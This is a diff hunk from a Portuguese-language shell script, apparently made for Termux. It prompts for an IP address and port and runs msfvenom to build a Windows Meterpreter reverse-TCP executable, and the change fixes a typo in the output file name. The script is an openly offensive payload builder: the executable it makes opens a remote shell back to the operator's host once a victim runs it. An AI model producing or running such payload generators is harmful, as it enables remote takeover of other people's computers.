@@ -9,7 +9,7 @@ read -p "Informe o ip externo ou interno seu > " ip1
 #Number Port
 read -p "Informe uma porta > " Port1
 
-msfvenom -p windows/meterpreter/reverse_tcp LHOST=$ip1 LPORT=$Port1 -f exe > /data/data/com.termux/files/home/$nom>
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=$ip1 LPORT=$Port1 -f exe > /data/data/com.termux/files/home/$nome>
  echo "Loading.."
 
 echo " ..............                                     "
